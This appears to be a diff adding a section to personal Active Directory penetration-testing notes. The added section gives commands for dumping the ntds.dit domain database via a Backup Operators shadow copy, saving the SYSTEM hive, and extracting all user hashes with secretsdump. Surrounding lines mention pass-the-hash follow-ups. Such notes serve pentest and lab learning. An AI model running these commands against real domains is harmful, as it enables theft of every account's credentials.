@@ -81,6 +81,23 @@ Then following https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmin
 
 ### If we have AD recycle bin group
 Then following this https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin we see that we can read deleted objects via `Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *`, which might contain some juicy stuff
+
+### If we are a member of Backup Operator (basically have SeBackupPrivilege and SeRestorePrivilege)
+Then following this https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960 we can make a shadow copy of the C drive to a different drive say, the E drive using `diskshadow /s script.txt` script.txt being the following
+```txt
+set verbose onX
+set metadata C:\Windows\Temp\meta.cabX
+set context clientaccessibleX
+set context persistentX
+begin backupX
+add volume C: alias cdriveX
+createX
+expose %cdrive% E:X
+end backupX
+```
+Then we use robocopy to copy the ntds from E drive to a place we can write using `robocopy /b E:\Windows\ntds . ntds.dit`. Then we save the system hive which has the master key used to decrypt the ntds using `reg save hklm\system "FILENAME"`.
+After that simply transfer both ntds.dit and the FILENAME you just saved into your kali machine, and use secretsdump of impacket to decrypt the ntds and get the hashes of all users, using the following `secretsdump.py LOCAL -ntds ntds.dit -system "FILENAME OF THE SYSTEM HIVE IN PREVIOUS STEP"`
+
 ## Lastly
 The 2nd part of the golden ticket will be the hash required for a pass the hash attack, which we may use to get access via evilwinrm or we might try to crack it, to get cleartext passwords
 
